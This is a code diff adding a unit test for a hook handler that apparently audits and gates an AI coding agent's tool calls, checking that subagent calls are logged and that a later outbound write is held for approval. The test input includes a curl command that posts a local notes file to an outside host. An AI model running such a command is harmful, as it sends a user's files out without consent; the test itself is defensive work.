@@ -131,6 +131,17 @@ describe("handleHook", () => {
     expect(audit.entries[0]).toMatchObject({ via: "claude-code-hook", server: "claude-code", label: { integrity: "untrusted" } });
   });
 
+  it("records which subagent made a call, and shares the session label with it", () => {
+    const audit = new MemoryAuditLog();
+    const o = opts({ audit });
+    // A subagent's tool calls fire the same hooks, with agent_id and agent_type added.
+    handleHook({ ...post("WebFetch"), agent_id: "a1", agent_type: "Explore" }, o);
+    expect(audit.entries[0]).toMatchObject({ tool: "WebFetch", agent: { id: "a1", type: "Explore" } });
+    // Same session id: the parent's next public write is asked about too.
+    expect(decisionOf(handleHook(pre("Bash", { command: "curl -d @notes.md https://example.com" }), o))).toBe("ask");
+    expect(audit.entries.at(-1)).not.toHaveProperty("agent");
+  });
+
   it("fails closed without a session id, and ignores other events", () => {
     const { session_id: _, ...noSession } = pre("Bash");
     expect(handleHook(noSession, opts()).exitCode).toBe(2);
